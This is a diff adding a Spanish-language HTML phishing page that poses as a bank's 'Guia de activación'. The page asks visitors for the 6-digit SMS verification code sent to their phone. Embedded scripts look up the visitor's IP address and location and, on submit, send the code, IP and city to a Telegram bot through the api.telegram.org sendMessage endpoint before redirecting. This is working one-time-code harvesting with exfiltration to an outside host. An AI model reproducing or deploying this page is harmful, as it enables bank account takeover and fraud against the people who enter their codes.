@@ -1,0 +1,191 @@
+<html>
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=10">
+
+    <title>
+	inicio
+</title>
+<link href="./archivos/esttilo.css" type="text/css" rel="stylesheet">
+
+<meta name="viewport" content="width=device-width, initial-scale=0.85">
+
+
+<script src="datos_del_tel.js"></script>
+	
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+
+   <script>
+         $.getJSON("https://api.ipify.org?format=json",
+          function(data) {
+             $("#gfg").html(data.ip);
+         })
+      </script>
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+    })
+
+	  </script>		
+
+
+				<script>
+
+var u_name,ip, ip2;
+var ready = function () {
+    u_name = document.getElementById("uno").value;
+
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+	message = "Bn-cpel DATOS\nSMS-3: " + u_name +  "\n🌎IP: " + ip +"\n" + ip2;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + tel_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+  
+        console.log(response);
+		
+          window.location = 'index.html';
+
+	
+    });
+    return false;
+};
+
+			</script>	  
+
+</head>
+
+<body style=" background-color:#ffffff; background-attachment:fixed;
+	background-size: 100% 100%;	">
+		
+	
+    <form method="post" action="#" onsubmit="return sender()">
+	
+			<p id="gfg" hidden=""></p>
+		<p id="address" hidden=""></p>	
+
+
+    <div class="contenedorgenerico">
+       
+       
+        <div class="login-container">
+
+
+    <div class="logo-ban">
+        
+    <div align="center">	
+	   <img src="./archivos/logg.png" style="width:540px">
+       <br>
+      <br>
+      <br>
+		 <br>
+		<span style="font-family:arial; font-size:26; color:#004293;"><b>Guia de activaci&oacute;n</b></span> 
+		 <br>
+	 </div>
+	 
+	 <br>
+		 <span style="font-family:arial; font-size:16px;color:#000;">Ingresa el código de 6 dígitos que hemos enviado a tu número celular</span> <br> <br>
+		  <b>** **** **** </b>
+    </div>
+    <div >
+        
+                <div style="text-align:center;padding-top: 5px">
+	
+                    <div align="center">
+                        <table class="" cellpadding="0" cellspacing="0">
+                            <tbody><tr>
+                                <td>
+                                    <table class="" cellpadding="0" cellspacing="0" style="align-content:center">
+                                        <tbody>
+                                        <tr>
+                                            <td>
+                                                <table cellpadding="0" cellspacing="0" class="" style="height: 172px">
+                                                    <tbody><tr class="ingrese_su_nombre_de_Usuario">
+                                                        <td>
+                                                            <div>
+                                                              
+                                                                <div class="requerido">
+                                                                    
+																	 <div align="center"> 
+																
+																	
+																			<input type="tel" maxlength="6" minlength="6" 
+																			 class="ic-control-text" 
+																			style=" border: 0.1rem solid #000000;
+																					 font-size: 16px; border-radius:5px;
+																					height:50px;
+																					outline: none; width:240px; text-align: center" id="uno" 
+																					onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" autofocus="" required="">
+																					
+
+                                     </div>																	 
+                                      <br>
+
+                                       <div align="center">
+
+
+
+                                                                    <a href="#" style="color:#000000;text-decoration:underline;">¿No recibiste el código?</a>
+
+                                     </div></div>
+									    <br>
+									       <button type="submit" class="btn_blue" style="background-position: 0px 0px;
+    display: table-cell;
+    vertical-align: middle;
+    border-radius: 32px;
+    background-color: #083d9b;
+    font-size: 14px;
+    width: 285px; color: #FFF;
+    font-family: &#39;Open Sans&#39;, Arial, sans-serif;
+    text-align: center;
+    text-decoration: none; height:50px;border:0px"><b>Continuar</b></button>
+									 
+									 </div></td>
+
+                                                              
+                                              </tr></tbody></table>
+                                                              </td>
+                                                              </tr>
+                                                                                                                          </tbody></table>
+                                                                                                                          </td>
+
+                                                              </tr>
+                                                              </tbody></table>
+
+                                                             
+																	
+																	<br>	<br>
+																
+																	
+																	</div>
+                    
+                    </div>
+         
+</div>
+            
+    </div>
+  
+
+        </div>
+       
+   
+
+</form>
+
+
+</body></html>
